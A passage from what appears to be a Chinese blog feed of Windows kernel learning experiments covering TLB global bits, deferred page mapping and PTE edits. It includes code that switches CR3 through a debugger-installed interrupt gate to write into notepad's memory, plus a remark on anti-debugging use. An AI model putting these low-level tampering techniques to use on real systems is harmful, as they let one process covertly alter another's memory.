class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>, g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_var:<span class="number">1</span></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><h2 id="G位，进一步提升性能"><a href="#G位，进一步提升性能" class="headerlink" title="G位，进一步提升性能"></a>G位，进一步提升性能</h2><p>页目录项和页表项的第8位是G(gloabal)位</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-DTLB/image-20230603122904700.png" alt="image-20230603122904700"></p><p>在tlb里会记录这个G位，如果是全局页，在刷新tlb(除了强制(invlpg)时，不会刷新带有G位的tlb项</p><p>这样做是因为内核中的多数数据是进程共享的，每次切换进程时刷新这些没必要刷新的内存浪费性能</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 8137ada0  SessionId: 0  Cid: 0430    Peb: 7ffdb000  ParentCid: 04f0</span><br><span class="line">    DirBase: 090c0360  ObjectTable: e24d1a98  HandleCount:  15.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 8137ada0</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">80528bdc cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 0x0041b000</span></span><br><span class="line">                    VA 0041b000</span><br><span class="line">PDE at C0600010            PTE at C00020D8</span><br><span class="line">contains 000000000FE30067  contains 8000000000938067</span><br><span class="line">pfn fe30      ---DA--UWEV  pfn 938       ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte gdtr</span></span><br><span class="line">                    VA 8003f000</span><br><span class="line">PDE at C0602000            PTE at C04001F8</span><br><span class="line">contains 0000000000B0A163  contains 000000000003F163</span><br><span class="line">pfn b0a       -G-DA--KWEV  pfn 3f        -G-DA--KWEV</span><br></pre></td></tr></table></figure><p>可以看到内核共享数据gdtr是有G属性的，但是3环数据就没有</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>) | <span class="number">0x100</span>;<span class="comment">//把虚拟地址的页表项改为Global</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax</span><br><span class="line">    &#125;<span class="comment">//刷新tlb</span></span><br><span class="line">    __asm mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//确保虚拟地址tlb里的g位置1</span></span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//换回原来的页表项</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov cr3, eax</span><br><span class="line">    &#125;<span class="comment">//刷新tlb，但是由于我们的page2 G位被置1，所以不会被刷新，page2还是指向page1物理页</span></span><br><span class="line">    <span class="comment">//__asm invlpg ds:[0x0041c000] //强制刷新，无视g位</span></span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//挂载物理内存的同时把虚拟内存放到tlb里</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>, g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g_var:1</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:延迟内存分配</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-延迟内存分配"><a href="#Windows内核实验-延迟内存分配" class="headerlink" title="Windows内核实验:延迟内存分配"></a>Windows内核实验:延迟内存分配</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD var1;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,var2</span><br><span class="line">        mov var1,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;var2:%p\n&quot;</span>,&amp;var2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var1:%d\n&quot;</span>,var1);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>用来分配一个新section，并把var2变量放入该section</p><p><a href="https://learn.microsoft.com/zh-cn/cpp/preprocessor/section?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/preprocessor/section?view=msvc-170</a></p><p><a href="https://learn.microsoft.com/zh-cn/cpp/cpp/allocate?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/cpp/allocate?view=msvc-170</a></p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/image-20230603011009892.png" alt="image-20230603011009892"></p><p>主要是为了让var2在一个新页开始，即4k对齐，而且这个页里只有这个变量</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">请按任意键继续. . .</span><br><span class="line">&amp;var2:<span class="number">0041B</span>000</span><br><span class="line">var1:<span class="number">0</span></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><p>没有是1的原因是<code>mov eax,var2</code>var2所在页第一次被访问，由于延迟绑定机制，会触发缺页异常，我们没有在中断里构造正确的环境，导致缺页处理程序不能正常执行，所以为0</p><p>但是如果我们在第一个pause停下时去用ce或者调试器访问这一段内存，会把这段虚拟内存映射到物理内存</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/image-20230603012716985.png" alt="image-20230603012716985"></p><p><strong>这种机制就可以用到反调试上面去</strong></p><p>其实只要读了var2的地址就会把这个页面映射</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD var1;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,var2</span><br><span class="line">        mov var1,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;var2:%p\n&quot;</span>,&amp;var2);</span><br><span class="line">    interrupt();<span class="comment">//读过地址后就会映射过来</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var1:%d\n&quot;</span>,var1);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;var2:<span class="number">0041B</span>000</span><br><span class="line">var1:<span class="number">1</span></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:平行进程</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-平行进程"><a href="#Windows内核实验-平行进程" class="headerlink" title="Windows内核实验:平行进程"></a>Windows内核实验:平行进程</h1><p>主要思想就是A进程在切换B进程的cr3后，将B进程中当前A进程的eip所指向的地址构造为要想要执行指令</p><h2 id="实验现象"><a href="#实验现象" class="headerlink" title="实验现象"></a>实验现象</h2><p><strong>process1.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//0x0041a1c8</span></span><br><span class="line">DWORD g_cr3;</span><br><span class="line">DWORD g_flag;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov g_cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">        <span class="comment">//00401048 CFiretd</span></span><br><span class="line">        <span class="comment">//0x401049 CCint3</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        nop<span class="comment">//0x40104e</span></span><br><span class="line">        nop<span class="comment">//0x40104f</span></span><br><span class="line">        nop<span class="comment">//0x401050</span></span><br><span class="line">        mov eax,<span class="number">0x654321</span></span><br><span class="line">        mov g_flag,eax</span><br><span class="line">        mov ecx,<span class="number">0x666666</span></span><br><span class="line">        mov eax,ds:[<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3,eax</span><br><span class="line">        <span class="comment">//00401066 0F 22 D8             mov         cr3,eax  </span></span><br><span class="line">        <span class="comment">//00401069 CC                   int         3  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cr3:0x%x\tg_flag:0x%x\n&quot;</span>, g_cr3, g_flag);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>process2.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//0x0041a1c8</span></span><br><span class="line">DWORD g_num;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov ds:[<span class="number">0x8003f130</span>],eax<span class="comment">//8003f130 gdtr表里空闲项</span></span><br><span class="line">        mov eax, <span class="number">0x8d301c0</span><span class="comment">//0x8d301c0 process1的cr3</span></span><br><span class="line">        mov cr3, eax</span><br><span class="line">        <span class="comment">//040104E 0F 22 D8    mov         cr3, eax</span></span><br><span class="line">        <span class="comment">//00401051 CC  int         3</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">//00401060 B8 FF FF FF FF       mov         eax, 0FFFFFFFFh</span></span><br><span class="line">        nop<span class="comment">//00401065</span></span><br><span class="line">        nop<span class="comment">//00401066</span></span><br><span class="line">        nop<span class="comment">//00401067</span></span><br><span class="line">        nop<span class="comment">//00401068</span></span><br><span class="line">        mov g_num, ecx</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cr3:0x%x\n&quot;</span>,g_num);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验现象就是先运行process1，打印cr3后gflag为0，运行process2后gfalg被修改为0x654321，且process2的g_num被修改为0x66666</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/image-20230602235651166.png" alt="image-20230602235651166"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/image-20230603000923428.png" alt="image-20230603000923428"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:跨进程内存读写</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-跨进程内存读写"><a href="#Windows内核实验-跨进程内存读写" class="headerlink" title="Windows内核实验:跨进程内存读写"></a>Windows内核实验:跨进程内存读写</h1><p>一个进程访问的虚拟内存都是靠页的各种表来管理的嘛，他的根源就是cr3寄存器，所以理论上我们把某个进程的cr3换过来就可以实现读写这个进程</p><p>打开一个notepad</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/image-20230602212944955.png" alt="image-20230602212944955"></p><p>用ce找到他的字符串内存地址为0xaab30</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span> notepad.exe</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">8165f</span>350  SessionId: <span class="number">0</span>  Cid: <span class="number">0688</span>    Peb: <span class="number">7f</span>fd8000  ParentCid: <span class="number">04</span>a4</span><br><span class="line">    DirBase: <span class="number">08b</span>d0240  ObjectTable: e14bcae8  HandleCount:  <span class="number">46.</span></span><br><span class="line">    Image: notepad.exe</span><br></pre></td></tr></table></figure><p>我们很自然的就会写出这样的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[<span class="number">0x8003f130</span>],eax<span class="comment">//8003f130 gdtr表里空闲项</span></span><br><span class="line">        mov eax,<span class="number">0x8bd0240</span> <span class="comment">//08bd0240 notepad对应cr3</span></span><br><span class="line">        mov cr3,eax  <span class="comment">//后面的指令压根不会执行</span></span><br><span class="line">        mov eax,<span class="number">0x12345678</span></span><br><span class="line">        mov ds:[<span class="number">0xaab30</span>],eax</span><br><span class="line">        mov eax,ds:[<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是其实mov cr3,eax 后面的指令压根不会执行，切换cr3后，我eip去取指令，但是现在已经是notepad的cr3了，自然不会取到我们程序的eip处指令，而是notepad的eip处指令，所以这段指令应该放到内核中每个进程都相同的地方，依旧选取gdt表里的空闲位置0x8003f140</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span>* Address = (<span class="type">char</span> *)<span class="number">0x8003f140</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EditNotepad</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        Address[i] = ((<span class="type">char</span>*)EditNotepad)[i];</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x8003f140</span></span><br><span class="line">        ret<span class="comment">//也可以用一个寄存器 jmp 寄存器来实现地址无关</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) EditNotepad() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov ds : [<span class="number">0x8003f130</span>] , eax<span class="comment">//8003f130 gdtr表里空闲项</span></span><br><span class="line">        mov eax, <span class="number">0x8bd0240</span> <span class="comment">//08bd0240 notepad对应cr3</span></span><br><span class="line">        mov cr3, eax</span><br><span class="line">        mov eax, <span class="number">0x12345678</span></span><br><span class="line">        mov ds : [<span class="number">0xaab30</span>] , eax</span><br><span class="line">        mov eax, ds : [<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/image-20230602220050054.png" alt="image-20230602220050054"></p><p>还可以用我们之前的做系统调用的方法去实现一个系统调用或中断来做</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:零地址读写</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Zero-address-read-write/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Zero-address-read-write/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-零地址读写"><a href="#Windows内核实验-零地址读写" class="headerlink" title="Windows内核实验:零地址读写"></a>Windows内核实验:零地址读写</h1><p>以后都是pae模式下的实验</p><p>零地址就是我们的空指针指向的位置嘛，0这块地址(准确的说应该是这一个页)本身就会被标记为不可访问，以便为空指针检测提供些支持，肯定是不能读或写的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0</span></span><br><span class="line">                    VA <span class="number">00000000</span></span><br><span class="line">PDE at C0600000            PTE at C0000000</span><br><span class="line">contains <span class="number">0000000008381067</span>  contains <span class="number">0000000000000000</span></span><br><span class="line">pfn <span class="number">8381</span>      ---DA--UWEV  not valid</span><br></pre></td></tr></table></figure><p>但是他毕竟也是进程虚拟内存的一块嘛，虚拟内存都是靠页目录表项和页表项描述的，去把他映射到物理内存，所有理论上把他的页表项的改掉就可以搞事情</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) 